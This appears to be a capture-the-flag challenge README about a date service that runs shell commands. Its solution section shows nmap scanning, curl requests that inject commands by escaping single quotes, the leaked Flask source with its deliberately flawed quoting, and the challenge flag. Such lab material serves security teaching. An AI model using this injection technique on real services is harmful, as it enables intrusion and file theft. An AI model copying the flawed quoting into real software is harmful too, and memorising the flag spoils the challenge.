# What's the date

Challenge testing bash command injection

### Task

There is an awesome free service returning you the current date running at 172.20.0.30. Fortunately, the developer did their best to secure the app. Was it enough?

## How to solve
<details>
  <summary>Click to reveal how to solve steps</summary>

1. Use `nmap` to find opened ports:
```bash
root@hackerlab:~# nmap 172.20.0.30
Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-07 09:30 UTC
Nmap scan report for bsy-playground-what-is-the-date-1.bsy-playground_playground-net (172.20.0.30)
Host is up (0.0000060s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 02:42:AC:14:00:1E (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.20 seconds
```

2. Discover opened port 80 and try to manipulate the server functionality:
```bash
root@hackerlab:~# curl http://172.20.0.30/   
<html>
        <head>
                <style>
                        body, pre {
                                color: #7b7b7b;
                                font: 300 16px/25px "Roboto",Helvetica,Arial,sans-serif;
                        }
                </style>
        <meta name="generator" content="vi2html">
        </head>
        <body>
        </br>
    See GET /cmd/date endpoint.</br>
    </body>
</html>
root@hackerlab:~# curl http://172.20.0.30/cmd/date
Tue May  7 09:31:30 UTC 2024
root@hackerlab:~# curl "http://172.20.0.30/cmd/date;ls"
/bin/sh: 1: date;ls: not found
```
3. We see we might inject some bash command. After some tweaking we must realize the inserted command is put between single quotes `'<cmd>'`. We can inject commands by ending the quotes.
```bash
root@hackerlab:~# curl "http://172.20.0.30/cmd/date';'ls"
Tue May  7 09:34:07 UTC 2024
index.html
server.py
root@hackerlab:~# curl "172.20.0.30/cmd/date';cat%20server.py;'ls;"
Tue May  7 09:34:35 UTC 2024
import subprocess

from flask import Flask, send_file

# Oh no, my quote was not enough? :O
# BSY{WYwjgqdrtyTiH9MFnyxMqvsFyYob0qGHYATtzf0HWoXiKnTofAUkVqAR4bed}

app = Flask(__name__)

def quote(cmd: str) -> str:
    return f"'{cmd}'"
...
```

</details>

## Testing

The script [auto-solve.sh](./auto-solve.sh) automatically verifies that the challenge can be solved.
